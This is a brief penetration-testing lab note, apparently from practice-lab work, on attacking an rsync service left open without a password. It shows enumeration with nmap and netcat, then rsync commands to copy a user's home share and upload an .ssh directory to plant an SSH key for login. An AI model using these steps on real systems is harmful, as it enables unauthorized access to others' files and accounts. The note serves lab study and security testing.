---
description: 873/tcp
---

# rsync - 873

```
873/tcp open  rsync   (protocol version 31)
```

```
$ nmap -sV --script "rsync-list-modules" -p 873 192.168.145.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-15 18:38 EST
Nmap scan report for 192.168.145.126
Host is up (0.064s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home

$ nc -nv 192.168.145.126 873
(UNKNOWN) [192.168.145.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
fox             fox home
@RSYNCD: EXIT
```

There is no password protection.

```
#Listing of shared folder
$ rsync -av --list-only rsync://192.168.145.126/fox 

#Copy contents of the specified folder
$ rsync -av rsync://192.168.145.126/fox ./fox

$ ssh-keygen -t rsa

#Dir uploading
$ rsync -av ~/Desktop/PG-Practice/Linux/Fail/.ssh rsync://192.168.145.126/fox
```
